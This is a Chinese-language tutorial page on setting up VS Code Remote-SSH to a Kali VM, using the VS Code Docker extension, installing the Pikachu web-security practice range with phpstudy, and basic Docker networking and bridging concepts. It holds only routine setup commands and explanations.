<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br></pre></td></tr></table></figure>

<p>安装完成后启动服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>

<h3><span id="get-remote-ssh">Get Remote - SSH</span></h3><p>为了使用vscode的远程ssh功能 您可能需要在扩展中安装<code> Remote - SSH</code>插件：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666002987439-4e307846-0b99-4578-9b54-ddd628aefd77.png" alt="img"></p>
<h3><span id="let-vscode-connect-to-host">Let Vscode Connect to host</span></h3><p>连接方式有两种：<code>密码连接</code> 和 <code>ssh的公私钥</code>。</p>
<p>一般情况下我们使用密码连接，这样的方法安全性较低，而且每次连接和每次切换目录的时候都会要求输入密码，所以在确保能够密码连接情况下，我们可以进一步使用公私钥验证的方式来提升安全性和优化操作友好性。</p>
<h4><span id="using-password-connection">Using password connection</span></h4><p>打开vscode，点击左下角的远程连接（绿色的部分）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665992886788-3aa8ff94-7d9f-461a-a1fb-4e108cffd83d.png" alt="img"></p>
<p>接着在弹出的窗口中选择 Connect to Host</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665992849406-4490a1c9-c017-4952-9930-c7845e7efd7e.png" alt="img"></p>
<p>选择 <code>Add New SSH Host</code>：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665992979730-8b19217b-f803-4298-8537-fcd5af749130.png" alt="img"></p>
<p>按照要求输入对应的指令：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993031322-111547cb-b185-4ca5-a767-e8c3ee49506f.png" alt="img"></p>
<p>IP可通过 <code>ip a</code> 获取</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993103994-c44e4858-ef69-45d9-9b5d-38150e83f710.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh kali@192.168.28.145 -A</span><br></pre></td></tr></table></figure>

<p>保存位置默认第一个就好：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993185976-069830bf-af5d-4a79-9a1d-3958e9b99274.png" alt="img"></p>
<p>然后连接：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993196349-e231aea3-bdd0-422d-b475-c4669252a75d.png" alt="img"></p>
<p>选择对应的系统：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993227789-8b0ec6b0-d9eb-4bcb-b0fd-94368350a908.png" alt="img"></p>
<p>选择继续：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993257173-dfc7b2ab-a5ee-4821-9e7e-3a7af8ac7cc7.png" alt="img"></p>
<p>输入密码：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993277058-231f6520-9afc-4375-9bf4-7c42f1718163.png" alt="img"></p>
<p>初始化完成后就连接上了：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993334466-214c5073-08fc-4492-9674-29b9e6e8fff3.png" alt="img"></p>
<h4><span id="using-public-and-private-keys">Using public and private keys</span></h4><h5><span id="create-public-and-private-keys">Create public and private keys</span></h5><p>首先在本机上生成对应的公钥私钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666022363207-1faad277-da27-4d65-9a77-7f65f22cc0d3.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter file in which to save the key (C:\Users\Probius/.ssh/id_rsa):</span><br></pre></td></tr></table></figure>

<p>输入保存路径，如果为空默认为 <code>C:\Users\USERNAME/.ssh/id_rsa</code>，这里笔者直接输入了名字，让其以该名字直接保存在当前目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter passphrase (empty for no passphrase):</span><br></pre></td></tr></table></figure>

<p>输入私钥密码，为空则没有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter same passphrase again:</span><br></pre></td></tr></table></figure>

<p>注意：如果您使用了私钥密码，那么在进行ssh登录的时候，会提示您输入私钥密码，相当于再使用公私钥登录的情况下又加了一层密码，安全性有很大的提升，但是这样会变得和密码登录一样每次都要输入，这里笔者建议，如果是本地一路回车就好了，如果是远程资源的管理，可以综合安全性考虑</p>
<p>生成过后，得到的<code>id_rsa.pub</code>(Kali_test.pub)是<strong>公钥</strong>，<code>id_rsa</code>(Kali_test)是<strong>私钥</strong> </p>
<p>将得到的私钥放在我们的.ssh(C:\Users\USERNAME.ssh)中。</p>
<p>(您也可以在生成的时候就让他防止在此，当然这并不是重点）</p>
<h5><span id="configuring-remote-host">Configuring Remote Host</span></h5><p>将得到的公钥上传到 Kali&#x2F;服务器中对应用户的.ssh文件夹中(请确保该文件夹至少有700的权限)：</p>
<p>（注意 kali默认没有该文件夹，需要用户手动创建，并且赋700权限 <code>mkdir ~/.ssh</code> ）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666023486280-3163a1ad-2809-44a8-a9e2-a8f29b452de3.png" alt="img"></p>
<p>在此处打开终端，用公钥文件来生成 authorized_keys：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> id_ras.pub &gt;&gt; authorized_keys</span><br><span class="line"><span class="comment"># 此处既 cat Kali_test.pub &gt;&gt; authorized_keys</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666023722693-73b3cecc-1273-4a42-88f8-9ed336a90588.png" alt="img"></p>
<p>由于Linux系统对.ssh拥有比较严格的权限限制，请确保权限配置正确：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> 600 authorized_keys</span><br><span class="line">sudo <span class="built_in">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure>

<p>编辑ssh配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>

<p>确保拥有以下条目：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RSAAuthentication <span class="built_in">yes</span></span><br><span class="line">PubkeyAuthentication <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>注意Kali的ssh默认配置是没有上诉两项的，需要自行添加：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666026484050-a32d3cb9-76dc-4635-bfa1-087cc833ee2d.png" alt="img"></p>
<p>然后搞定一切后 重启SSH服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>

<p>Linux部分的配置这样就搞定啦~</p>
<p>（在您确保您的连接无误后，如果是服务器等远程设备，可以在config中关闭密码登录以提升安全性：</p>
<p><code>PasswordAuthentication no</code>）</p>
<h5><span id="configuring-local-host">Configuring Local Host</span></h5><p>然后是Windows，也就是vscode这边的配置：</p>
<p>添加NewHost：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666028378220-501e16a9-549c-4312-8afd-3e73b559abe5.png" alt="img"></p>
<p>使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh USERNAME@IP -i C:\\Users\\Probius\\.ssh\\RAS_ID</span><br></pre></td></tr></table></figure>

<p>（注意使用指令添加时，务必使用双斜杠）</p>
<p>当然，也可以在已经添加的配置文件上改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host 192.168.28.145</span><br><span class="line">	HostName 192.168.28.145</span><br><span class="line">	User kali</span><br><span class="line">	IdentityFile C:\Users\Probius\.ssh\Kali_test</span><br></pre></td></tr></table></figure>

<p>如果操作无误，且没有设置私钥密码，那么点击连接之后无需其他额外操作即可连接；如果设置了私钥密码，那么按照提示输入即可。</p>
<h5><span id="other_about-ssh-key-login">Other_About SSH key login</span></h5><p>关于ssh密钥登录的更多知识可以看这一篇文章：</p>
<p><a href="https://wangdoc.com/ssh/key.html">https://wangdoc.com/ssh/key.html</a></p>
<h3><span id="get-the-docker-extension">Get The Docker Extension</span></h3><h4><span id="install-extension">Install extension</span></h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993503285-4cad91c3-c5be-42f1-949b-b06dd63b3dce.png" alt="img"></p>
<p>（当然 如果显示的是 <code>安装</code>也是一样的）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993640582-33e0292d-1a01-4a4e-bdb4-5052a3cc658d.png" alt="img"></p>
<h4><span id="solve-error">Solve error</span></h4><p>如果您使用自动安装，应该不会遇到该问题，自动安装的sh会自动完成用户组添加的操作。</p>
<p>由于权限原因，我们可能无法访问到  <code>/var/run/docker.sock</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666085731016-37a5a8a0-770c-4759-ac00-4c124fcd5165.png" alt="img"></p>
<h5><span id="by-add-user-group">By add user group</span></h5><p>一劳永逸的解决权限问题，将当前用户组添加到docker组即可。</p>
<p>创建docker用户组，默认安装时就会自动创建，所以执行可能会显示<code>exist</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo groupadd docker </span><br></pre></td></tr></table></figure>

<p>添加当前用户到该组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG docker <span class="variable">$&#123;USER&#125;</span> </span><br></pre></td></tr></table></figure>

<p>然后重新启动容器服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart docker </span><br></pre></td></tr></table></figure>

<p>再次重新登入即可，如果重新登录之后依旧报错无法读取，请尝试重启：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h5><span id="by-chmod">By chmod</span></h5><p>也可以使用<code> sudo chmod 777 /var/run/docker.sock</code>，但是每次重启之后权限都会重置，不推荐</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993792130-55218849-ff43-4565-8b31-b7a7d81a99f6.png" alt="img"></p>
<p>然后就能正常访问了：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665993848043-242f6244-7db2-4cd0-bfe4-5f1c5456ce0b.png" alt="img"></p>
<h3><span id="start-use">Start Use</span></h3><p>（以下操作使用<strong>DockerHub</strong>演示）</p>
<p>因为在安装Docker的时候登录过DockerHub所以这里连接之后，系统会自动获取您的凭证，您可以在这查看您的DockerHub仓库：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665994063185-82918af8-46ea-43a3-a524-f5a66280d2b2.png" alt="img"></p>
<p>当然，您也可以添加其他仓库，具体的用法可以参考官方文档：</p>
<p><a href="https://code.visualstudio.com/docs/containers/quickstart-container-registries">https://code.visualstudio.com/docs/containers/quickstart-container-registries</a></p>
<h4><span id="pull-image">Pull Image</span></h4><p>当然 对于自己仓库的镜像还是比较方便的233：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665995599834-3c92a723-9476-43d9-aa8f-9553055a3403.png" alt="img"></p>
<p>当然如果是公开镜像的话 还是免不了指令啦，不过还是比较方便的，旁边就是终端：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665995757090-9bd04c4b-fb0b-47a1-b96c-c6393e110ba4.png" alt="img"></p>
<p>完成之后就能在IMAGES栏看到了：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665995915572-4b40f768-d4d5-4f32-a536-ffadb2421c86.png" alt="img"></p>
<h4><span id="run-docker">Run Docker</span></h4><p>运行容器有两个选项Run &#x2F; Run Ineractive</p>
<h5><span id="run">Run</span></h5><p>默认后台运行，Run执行后效果和在Linux执行 -d的效果相同：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666116092112-5dc775b4-197e-48b1-a345-3bde2132a8ac.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665997253030-26e1cb0b-0014-4c19-b2e6-f219945e510a.png" alt="img"></p>
<h5><span id="run-interacitve">Run Interacitve</span></h5><p>该选项运行执行后，除了运行容器，还会跳到容器的汇总shell处，这里会实时打印容器日志，</p>
<p>效果和 <code>View Log</code>效果相同：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666116324737-328fd245-853d-416c-acf7-6adfd5f1e7e3.png" alt="img"></p>
<h4><span id="view-log">View Log</span></h4><p>直达容器后台日志，如果在运行的时候选择<code>Run Interacitve</code>那么也会跳转到该log页面。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665998996602-944ea384-cf80-4711-9989-b937c4bd02a6.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665999366319-2a41bc0f-4f89-4b63-9cd5-253b54bcd031.png" alt="img"></p>
<h4><span id="attach-shell">Attach Shell</span></h4><p>右键选中之后可以直接建立一个容器内部的shell，省去<code>docker exec -i -t  ID /bin/bash</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665998911154-243825b7-d7be-47fa-9a30-214d7591f75f.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665999322527-061fab7c-02b4-471c-92bd-b64a716ee583.png" alt="img"></p>
<h4><span id="edit-container">Edit Container</span></h4><p>在CONTAINERS中下拉一个容器的file可以对其进行查看和编辑：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665997210054-cc018f63-7e66-4201-a27c-2aa6c78d7b0a.png" alt="img"></p>
<p>可以看到对于容器来说 修改是即时的（支持热更新的）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665997987509-8642ebda-72c7-45a8-b2f4-9e1ef04ac2da.png" alt="img"></p>
<h4><span id="attach-containeradvanced-edit">Attach Container（Advanced Edit？）</span></h4><p>我们也可以用Vscode建立类似SSH的连接，直接连接到整个容器：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665998467833-cf59f140-9f33-43c1-a2b2-c635c6662598.png" alt="img"></p>
<p>并且操作同步：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665998565856-6d6953de-1afd-4a98-b99f-a9076387a9b3.png" alt="img"></p>
<p>而且容器支持文件拖拽，相比单纯的COPY指令 拥有更好的体验（个人感觉</p>
<h4><span id="port-forward">Port Forward</span></h4><p>通过SSH直接将远程端口转发到本地，免除防火墙困扰ww</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665999460970-c81a131d-6712-4ab9-9b30-d0fd0084a6cb.png" alt="img"></p>
<p>一般来讲在您启动容器的时候 vscode会自动配置 当然为了更好的区分和避免冲突 也可以手动分配</p>
<p>配置如图：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666000511669-34c924ab-ac4a-42d5-92cb-8b658afe39f1.png" alt="img"></p>
<h4><span id="open-in-borrow">Open in Borrow</span></h4><p>如果您配置完成了端口转发(或者vscode自动为您完成配置）那么点击Open in Borrow将在您的默认浏览器中快速打开该端口对应的页面：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666117172873-9d4b7fb4-574d-426d-8dd3-b62b5c1b71e1.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666117247770-7b5c5b4c-a8f9-4c70-9bdc-61b21790fb28.png" alt="img"></p>
<h4><span id="other">Other</span></h4><p>其他用法，就请佬们自行探索啦ww</p>
<h2><span id="extensionrecommend">ExtensionRecommend</span></h2><h3><span id="thunder-client">Thunder Client</span></h3><p>Thunder Client is a lightweight Rest API Client Extension for Visual Studio Code, hand-crafted by Ranga Vadhineni with simple and clean design.</p>
<p>要注意的是 该插件基于远程运行（既本体在虚拟机&#x2F;服务器上），在测试的时候请确保url指向正确。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666002204613-bd552d8b-851a-4528-baf0-fbe018d7ad51.png" alt="img"></p>
<h1><span id="win11虚拟机部署pikachu">win11虚拟机部署pikachu</span></h1><p>Phpstudy，Phpstorm，pikachu、外加的话浏览器别太老。<br>Phpstudy：<a href="https://www.xp.cn/">https://www.xp.cn/</a><br>Phpstorm：<a href="https://www.jetbrains.com/zh-cn/phpstorm/">https://www.jetbrains.com/zh-cn/phpstorm/</a><br>pikachu：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
<p>这里我并没有一步一步截图，因为碰壁很多次，所以，我将针对我所遇到的问题以及解决方法展开阐述，仅供参考。<br>1、win11本机搭建步骤</p>
<p>1、安装Phpstudy以及Phpstorm软件，并启动apacha以及mysql<br><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530151311289.png" alt="image-20240530151311289"><br>其实，这里一个版本就行。</p>
<p>2、这下去pikachu的那个文件进行把mysql的root密码写进去，这里如果你的密码不是初始密码root的话，那么这里则需要修改两个Php中的密码：</p>
<p>3、修改密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530151238531.png" alt="image-20240530151238531"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530151250834.png" alt="image-20240530151250834"></p>
<p>4、ctrl+c以及ctrl+v将修改之后的pikachu文件放在phpstudy安装之后文件夹的www文件目录中；</p>
<p>5、修改完之后我就又碰见了问题四，也就是执行127.0.0.1&#x2F;pikachu之后报错<br>说有个文件的14行有错误。详见问题四：</p>
<p>6、直接进入浏览器输入127.0.0.1&#x2F;pikachu<br><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530151224015.png" alt="image-20240530151224015"><br>7、当然，这里是win主机搭建的靶机，而且即使到这一步依旧没有结束<br>因为还要进行安装初始化：<br>所以，在URL输入框中，我们输入127.0.0.1&#x2F;pikachu&#x2F;install.php<br>然后回车就可以看到安装以及初始化了：<br><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530151158114.png" alt="image-20240530151158114"><br>我所碰见的问题以及解决方式：</p>
<p>1、文件打不开，也就是pikachu的那个ins配置文件直接打不开，这个我觉得和电脑以及环境有关，我使用的是win11，之前win10还没碰见过这种情况：<br>解决方式：<br>这里我采用的是直接关机重启，这里注意进程，最好别有什么系统程序执行</p>
<p>2、至于上面pikachu配置文件更改，也就是给那个里面写入root的密码，双击那个文件直接卡住的情况：<br>解决方式：<br>这里直接打开Phpstorm软件进行选中文件打开，这里自己找到文件的路径进行打开。<br>这里路径不好找？可以去搜everthing官网进行下载（搜索文件很快）。<br><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530150821979.png" alt="image-20240530150821979"></p>
<p>3、主机与虚拟机win2012进行连接实现文件传输达不到，使用moba以及winSCP都无法连接到，那么文件该如何传输到虚拟机中？<br><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530150808530.png" alt="image-20240530150808530"><br>解决方式：<br>这里用到了VMware tools，首先，我们将win2012先关闭客户机：<br>然后点击编辑虚拟机设置——&gt;选项——&gt;共享文件夹<br><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530150759674.png" alt="image-20240530150759674">这里创建一个共享文件夹实现本机与win2012的文件互通。</p>
<p>4、这里浏览器输出127.0.0.1&#x2F;pikachu的图像，这里报错了，很明显可以看到是mysql的密码导致的错误，可这里并没有出错，两个文件都配置的是root用户名以及root密码：<br>解决方式：<br>这里在小皮也就是Phpstudy中添加创建一个数据库：<br><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240530150749344.png" alt="image-20240530150749344"><br>点击上面的创建数据库，如果出现了root密码未修改，那么一修改，然后继续创建数据库，同样设置6位以上的密码，没什么讲究的。这下即可成功进入靶场。</p>
<p>5、我进行安装以及初始化之后，浏览器中改变URL之后回车，链接后面便加上一个#号，同时界面是一个固定的界面，不能进行跳转界面：<br>解决方法：<br>嗯······我当时使用的是win2012的浏览器，这里换个浏览器重新在虚拟机访问127.0.0.1&#x2F;pikachu便好······没什么技术要求，以及在本机访问中，也就不会出现这样的情况了。</p>
<p>好了，pikachu靶场搭建就分享到这，希望能帮到各位。<br>————————————————</p>
<p>原文链接：<a href="https://blog.csdn.net/weixin_63172698/article/details/131498908">https://blog.csdn.net/weixin_63172698/article/details/131498908</a></p>
<h1><span id="数据库">数据库</span></h1><p><a href="https://www.runoob.com/mysql/mysql-tutorial.html">MySQL 教程 | 菜鸟教程 (runoob.com)</a></p>
<p>可以使用phpstudy自带的sql_front或navicat通过pikachu数据库进行一系列实践</p>
<p>或者我之前的个人笔记也有的</p>
<h1><span id="docker网络">Docker网络</span></h1><h2><span id="docker网络理论">Docker网络理论</span></h2><p>容器网络实际上是<strong>由Docker为应用程序所创造的虚拟环境的一部分，它能够使应用从宿主机操作系统的网络系统中独立出来。</strong>形成容器自有的网络设备、IP 协议栈、端口套接字、IP 路由表、防火墙等等与网络相关的模块。</p>
<h3><span id="cnm"><strong>CNM</strong></span></h3><p>Docker 网络架构采用的设计规范是 CNM（Container Network Model）：<strong>CNM 中规定了 Docker 网络的基础组成要素：Sandbox、Endpoint、Network。如图所示，</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240604004145261.png" alt="image-20240604004145261"></p>
<ul>
<li>Sandbox，提供了<strong>容器的虚拟网络栈</strong>，也即端口套接字、IP 路由表、防火墙、DNS 配置等内容。<strong>主要用于隔离容器网络与宿主机网络</strong>，形成了完全独立的容器网络环境。</li>
<li>Network，Docker 内部的虚拟子网，网络内的参与者相互可见并能够进行通讯。<strong>Docker 的虚拟网路和宿主机网络是存在隔离关系的，其目的主要是形成容器间的安全通讯环境。</strong></li>
<li>Endpoint，<strong>就是虚拟网络的接口</strong>，就像普通网络接口一样，Endpoint 的主要职责是<strong>负责创建连接。在 CNM 中，终端负责将沙盒连接到网络。</strong>个人理解：Endpoint 与常见的网络适配器类似，也就意味着 Endpoint 只能接入某一个网络。<strong>因此，如果容器需要接入到多个网络，就需要多个 Endpoint。</strong></li>
</ul>
<h3><span id="libnetwork"><strong>Libnetwork</strong></span></h3><p>Libnetwork 是 CNM 的标准实现。Libnetwork 是开源库，采用 Go 语言编写（跨平台的），也是 Docker 所使用的库，Docker 网络架构的核心代码都在这个库中。</p>
<h2><span id="驱动"><strong>驱动</strong></span></h2><p>“驱动”在计算机和电子设备领域中，通常指的是设备驱动程序（Device Driver），是一种特殊的软件程序，负责控制硬件设备的操作并与操作系统进行通信。<strong>驱动程序充当硬件与操作系统或应用程序之间的中介，</strong>使得软件可以通过标准化的接口与硬件设备进行交互，而无需了解硬件设备的具体实现细节。</p>
<h3><span id="驱动的主要功能">驱动的主要功能</span></h3><ol>
<li><p><strong>硬件初始化</strong>：</p>
<ul>
<li>驱动程序在设备启动时初始化硬件，使其处于可以正常工作的状态。</li>
</ul>
</li>
<li><p><strong>中断处理</strong>：</p>
<ul>
<li>处理来自硬件设备的中断信号，并将相应的信息传递给操作系统或应用程序。</li>
</ul>
</li>
<li><p><strong>数据传输</strong>：</p>
<ul>
<li>管理硬件设备的数据传输，包括读取和写入操作。比如，从硬盘读取数据或向打印机发送打印作业。</li>
</ul>
</li>
<li><p><strong>提供接口</strong>：</p>
<ul>
<li>提供标准化的接口，使得操作系统和应用程序能够通过统一的方法访问硬件设备的功能。</li>
</ul>
</li>
</ol>
<h3><span id="驱动程序的类型">驱动程序的类型</span></h3><p>驱动程序可以根据不同的设备类型进行分类，以下是一些常见的驱动程序类型：</p>
<ol>
<li><p><strong>设备驱动程序</strong>：</p>
<ul>
<li>控制特定硬件设备的驱动程序，如键盘、鼠标、打印机、硬盘等。</li>
</ul>
</li>
<li><p><strong>内核驱动程序</strong>：</p>
<ul>
<li>运行在操作系统内核中的驱动程序，<strong>提供低级别的硬件控制和管理。</strong></li>
</ul>
</li>
<li><p><strong>文件系统驱动程序</strong>：</p>
<ul>
<li>负责管理文件系统的驱动程序，使得操作系统能够读取和写入存储设备上的文件。</li>
</ul>
</li>
<li><p><strong>网络驱动程序</strong>：</p>
<ul>
<li>管理网络接口卡（NIC）或其他网络设备的驱动程序，负责网络通信和数据传输。</li>
</ul>
</li>
</ol>
<h3><span id="驱动程序的安装与更新">驱动程序的安装与更新</span></h3><p>驱动程序通常由硬件设备制造商提供，可以通过以下几种方式安装和更新：</p>
<ol>
<li><p><strong>操作系统自带</strong>：</p>
<ul>
<li>操作系统通常自带一些常用硬件设备的驱动程序，安装操作系统时会自动安装这些驱动程序。</li>
</ul>
</li>
<li><p><strong>设备制造商提供</strong>：</p>
<ul>
<li>硬件设备通常附带驱动程序安装光盘或下载链接，用户可以通过制造商的网站下载最新的驱动程序。</li>
</ul>
</li>
<li><p><strong>自动更新</strong>：</p>
<ul>
<li>现代操作系统（如Windows Update）提供自动更新功能，可以自动检测并安装最新的驱动程序。</li>
</ul>
</li>
</ol>
<h3><span id="示例">示例</span></h3><p>以下是一些具体的驱动程序示例：</p>
<ol>
<li><p><strong>显卡驱动程序（Graphics Driver）</strong>：</p>
<ul>
<li>控制显卡硬件，提供图形显示和渲染功能。例如，NVIDIA或AMD提供的显卡驱动程序。</li>
</ul>
</li>
<li><p><strong>声卡驱动程序（Audio Driver）</strong>：</p>
<ul>
<li>控制声卡硬件，提供音频输入和输出功能。例如，Realtek声卡驱动程序。</li>
</ul>
</li>
<li><p><strong>网络适配器驱动程序（Network Adapter Driver）</strong>：</p>
<ul>
<li>控制网络适配器硬件，提供网络连接和数据传输功能。例如，Intel或Broadcom网络适配器驱动程序。</li>
</ul>
</li>
</ol>
<h3><span id="驱动程序的工作原理">驱动程序的工作原理</span></h3><p>驱动程序通常包括以下几个主要部分：</p>
<ol>
<li><p><strong>硬件接口</strong>：</p>
<ul>
<li>直接与硬件设备交互，发送命令和接收数据。</li>
</ul>
</li>
<li><p><strong>操作系统接口</strong>：</p>
<ul>
<li>提供给操作系统的标准化接口，使得操作系统能够通过系统调用与硬件设备交互。</li>
</ul>
</li>
<li><p><strong>中断处理</strong>：</p>
<ul>
<li>处理硬件设备发出的中断信号，并通知操作系统进行相应的处理。</li>
</ul>
</li>
<li><p><strong>内存管理</strong>：</p>
<ul>
<li>管理硬件设备使用的内存空间，包括数据缓冲区和控制寄存器。</li>
</ul>
</li>
</ol>
<h3><span id="结论">结论</span></h3><p><strong>驱动程序在计算机系统中扮演着关键角色，通过提供标准化的接口，使得操作系统和应用程序能够高效、安全地与各种硬件设备进行交互。</strong>了解驱动程序的基本原理和类型，有助于更好地管理和维护计算机系统，确保硬件设备的正常运行和最佳性能。</p>
<h3><span id="驱动-for-docker">驱动　 for　Ｄｏｃｋｅｒ</span></h3><p>驱动就负责实现数据层。比如<strong>网络的连通性和隔离性是由驱动来处理的</strong>。驱动通过实现特定网络类型的方式扩展了 Docker 网络栈，例如桥接网络和覆盖网络。</p>
<p>Docker 内置了若干驱动，通常被称作原生驱动或者本地驱动。比如 <strong>Bridge Driver</strong>、<strong>Host Driver</strong>、<strong>Overlay Driver</strong>、<strong>MacLan Driver</strong>、<strong>None Driver</strong> 等等。第三方也可以编写 Docker 网络驱动，这些驱动被叫做远程驱动，例如 Calico、Contiv、Kuryr 以及 Weave 等。每个驱动负责创建其上所有网络资源的创建和管理。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240604004633142.png" alt="image-20240604004633142"></p>
<p>在 Docker 安装时，会自动安装一块 Docker 网卡称为 docker0，用于 Docker 各容器及宿主机的网络通信。</p>
<h1><span id="桥接网络基本概念">桥接网络基本概念</span></h1><p>桥接网络（Bridging Network）是一种网络配置方法，通过使用网络桥接（network bridging）技术将两个或多个网络段连接在一起，使它们能够作为一个统一的网络进行通信。这种技术常用于局域网（LAN）环境中，以扩展网络的覆盖范围或连接不同的网络类型。</p>
<h4><span id="网络桥接的基本概念">网络桥接的基本概念</span></h4><p>网络桥接的基本概念包括以下几个方面：</p>
<ol>
<li><p><strong>网络桥（Bridge）</strong>：</p>
<ul>
<li>网络桥是一种网络设备，可以是专用硬件设备或软件实现的虚拟桥。<strong>其主要功能是连接两个或多个网络段，使它们能够互相通信</strong>。</li>
<li>桥接设备会在<strong>不同的网络段之间转发数据包</strong>，使用媒体访问控制（MAC）地址来决定数据包的转发路径。</li>
</ul>
</li>
<li><p><strong>透明桥（Transparent Bridge）</strong>：</p>
<ul>
<li>透明桥是最常见的一种网络桥，它在连接的网络段之间转发数据包，而不会对网络协议进行任何修改。</li>
<li>透明桥通过学习网络设备的MAC地址来建立内部地址表，从而智能地转发数据包，仅将数据包发送到目标网络段。</li>
</ul>
</li>
</ol>
<h4><span id="桥接网络的用途">桥接网络的用途</span></h4><p>桥接网络可以用于多种用途，包括但不限于：</p>
<ol>
<li><p><strong>扩展网络覆盖范围</strong>：</p>
<ul>
<li>通过将两个或多个物理分开的网络段桥接在一起，可以扩展网络的覆盖范围，使更多的设备能够互相通信。</li>
</ul>
</li>
<li><p><strong>连接不同类型的网络</strong>：</p>
<ul>
<li>桥接可以<strong>连接不同类型的网络，例如以太网和无线网络</strong>，使得有线设备和无线设备能够在同一个网络中通信。</li>
</ul>
</li>
